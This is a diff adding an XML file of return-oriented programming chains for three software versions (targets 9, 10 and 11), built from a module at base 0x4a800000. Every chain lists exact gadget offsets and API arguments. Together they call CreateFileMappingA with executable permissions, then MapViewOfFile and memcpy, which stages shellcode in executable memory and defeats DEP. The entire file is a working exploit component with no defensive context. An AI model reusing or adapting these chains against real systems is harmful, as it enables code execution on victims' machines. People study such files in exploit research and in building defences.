@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+
+<rop>
+  <compatibility>
+    <target>9</target>
+  </compatibility>
+
+  <gadgets base="0x4a800000">
+    <gadget offset="0x2313d">pop ecx # ret</gadget>
+    <gadget offset="0x2a713">push eax # pop esp # ret</gadget>
+    <gadget offset="0x01f90">pop eax # ret</gadget>
+    <gadget offset="0x49038">ptr to CreateFileMappingA()</gadget>
+    <gadget offset="0x07e7d">call [eax] # ret</gadget>
+    <gadget value="0xffffffff">HANDLE hFile</gadget>
+    <gadget value="0x00000000">LPSECURITY_ATTRIBUTES lpAttributes</gadget>
+    <gadget value="0x00000040">DWORD flProtect</gadget>
+    <gadget value="0x00000000">DWORD dwMaximumSizeHigh</gadget>
+    <gadget value="0x00001000">DWORD dwMaximumSizeHigh</gadget>
+    <gadget value="0x00000000">LPCTSTR lpName</gadget>
+    <gadget offset="0x0155a">pop edi # ret</gadget>
+    <gadget offset="0x43a84">pop ebp # pop ebx # pop ecx # ret</gadget>
+    <gadget offset="0x2d4de">pop ebx # ret</gadget>
+    <gadget offset="0x01f90">pop eax # ret</gadget>
+    <gadget offset="0x476aa">pop ecx # ret</gadget>
+    <gadget offset="0x49030">ptr to MapViewOfFile()</gadget>
+    <gadget offset="0x44122">mov edx, ecx</gadget>
+    <gadget offset="0x476aa">pop ecx # ret</gadget>
+    <gadget offset="0x07e7d">call [eax] # ret</gadget>
+    <gadget offset="0x13178">pushad # add al, 0 # ret</gadget>
+    <gadget value="0x00000026">DWORD dwDesiredAccess</gadget>
+    <gadget value="0x00000000">DWORD dwFileOffsetHigh</gadget>
+    <gadget value="0x00000000">DWORD dwFileOffsetLow</gadget>
+    <gadget value="0x00000000">SIZE_T dwNumberOfBytesToMap</gadget>
+    <gadget offset="0x43a82">pop edi # pop esi # pop ebp # pop ebx # pop ecx # ret</gadget>
+    <gadget offset="0x46c5e">jmp IAT msvcr80!memcpy</gadget>
+    <gadget offset="0x476ab">ret</gadget>
+    <gadget value="junk">JUNK</gadget>
+    <gadget value="0x00000400">memcpy length</gadget>
+    <gadget value="junk">JUNK</gadget>
+    <gadget offset="0x17984">xchg eax, ebp # ret</gadget>
+    <gadget offset="0x13178">pushad # add al, 0 # ret</gadget>
+  </gadgets>
+</rop>
+
+<rop>
+  <compatibility>
+    <target>10</target>
+  </compatibility>
+
+  <gadgets base="0x4a800000">
+    <gadget offset="0x26015">pop ecx # ret</gadget>
+    <gadget offset="0x2e090">push eax # pop esp # ret</gadget>
+    <gadget offset="0x2007d">pop eax # ret</gadget>
+    <gadget offset="0x50038">ptr to CreateFileMappingA()</gadget>
+    <gadget offset="0x246d5">call [eax] # ret</gadget>
+    <gadget value="0xffffffff">HANDLE hFile</gadget>
+    <gadget value="0x00000000">LPSECURITY_ATTRIBUTES lpAttributes</gadget>
+    <gadget value="0x00000040">DWORD flProtect</gadget>
+    <gadget value="0x00000000">DWORD dwMaximumSizeHigh</gadget>
+    <gadget value="0x00001000">DWORD dwMaximumSizeHigh</gadget>
+    <gadget value="0x00000000">LPCTSTR lpName</gadget>
+    <gadget offset="0x05016">pop edi # ret</gadget>
+    <gadget offset="0x4420c">pop ebp # pop ebx # pop ecx # ret</gadget>
+    <gadget offset="0x14241">pop ebx # ret</gadget>
+    <gadget offset="0x2007d">pop eax # ret</gadget>
+    <gadget offset="0x26015">pop ecx # ret</gadget>
+    <gadget offset="0x50030">ptr to MapViewOfFile()</gadget>
+    <gadget offset="0x4b49d">mov edx, ecx</gadget>
+    <gadget offset="0x26015">pop ecx # ret</gadget>
+    <gadget offset="0x246d5">call [eax] # ret</gadget>
+    <gadget offset="0x14197">pushad # add al, 0 # ret</gadget>
+    <gadget value="0x00000026">DWORD dwDesiredAccess</gadget>
+    <gadget value="0x00000000">DWORD dwFileOffsetHigh</gadget>
+    <gadget value="0x00000000">DWORD dwFileOffsetLow</gadget>
+    <gadget value="0x00000000">SIZE_T dwNumberOfBytesToMap</gadget>
+    <gadget offset="0x14013">pop edi # pop esi # pop ebp # pop ebx # pop ecx # ret</gadget>
+    <gadget offset="0x4e036">jmp to IAT msvcr90!memcpy</gadget>
+    <gadget offset="0x2a8df">ret</gadget>
+    <gadget value="junk">JUNK</gadget>
+    <gadget value="0x00000400">memcpy length</gadget>
+    <gadget value="junk">JUNK</gadget>
+    <gadget offset="0x18b31">xchg eax, ebp # ret</gadget>
+    <gadget offset="0x14197">pushad # add al, 0 # ret</gadget>
+  </gadgets>
+</rop>
+
+<rop>
+  <compatibility>
+    <target>11</target>
+  </compatibility>
+
+  <gadgets base="0x4a800000">
+    <gadget offset="0x5822c">pop ecx # ret</gadget>
+    <gadget offset="0x2f129">push eax # pop esp # ret</gadget>
+    <gadget offset="0x5597f">pop eax # ret</gadget>
+    <gadget offset="0x66038">ptr to CreateFileMappingA()</gadget>
+    <gadget offset="0x3f1d5">call [eax] # ret</gadget>
+    <gadget value="0xffffffff">HANDLE hFile</gadget>
+    <gadget value="0x00000000">LPSECURITY_ATTRIBUTES lpAttributes</gadget>
+    <gadget value="0x00000040">DWORD flProtect</gadget>
+    <gadget value="0x00000000">DWORD dwMaximumSizeHigh</gadget>
+    <gadget value="0x00001000">DWORD dwMaximumSizeHigh</gadget>
+    <gadget value="0x00000000">LPCTSTR lpName</gadget>
+    <gadget offset="0x55093">pop edi # ret</gadget>
+    <gadget value="junk">JUNK</gadget>
+    <gadget offset="0x50030">pop ebx # pop esi # pop ebp # ret</gadget>
+    <gadget offset="0x5597f">pop eax # ret</gadget>
+    <gadget offset="0x50031">pop esi # pop ebp # ret</gadget>
+    <gadget value="junk">JUNK</gadget>
+    <gadget offset="0x5822c">pop ecx # ret</gadget>
+    <gadget offset="0x3f1d5">call [eax] # ret</gadget>
+    <gadget offset="0x5d4f8">pop edx # ret</gadget>
+    <gadget offset="0x66030">ptr to MapViewOfFile()</gadget>
+    <gadget offset="0x14864">pushad # add al, 0 # pop ebp # ret</gadget>
+    <gadget value="0x00000026">DWORD dwDesiredAccess</gadget>
+    <gadget value="0x00000000">DWORD dwFileOffsetHigh</gadget>
+    <gadget value="0x00000000">DWORD dwFileOffsetLow</gadget>
+    <gadget value="0x00000000">SIZE_T dwNumberOfBytesToMap</gadget>
+    <gadget offset="0x14856">pop edi # pop esi # pop ebp # ret</gadget>
+    <gadget offset="0x505a0">memcpy address</gadget>
+    <gadget offset="0x60bc4">call eax # ret</gadget>
+    <gadget offset="0x505a0">memcpy address</gadget>
+    <gadget offset="0x1c376">xchg eax, ebp # ret</gadget>
+    <gadget offset="0x463d0">pop ebx # ret</gadget>
+    <gadget value="0x00000400">memcpy length</gadget>
+    <gadget offset="0x5d4f8">pop edx # ret</gadget>
+    <gadget offset="0x5d4f8">pop edx # ret</gadget>
+    <gadget offset="0x14864">pushad # add al, 0 # pop ebp # ret</gadget>
+  </gadgets>
+</rop>
+</db>
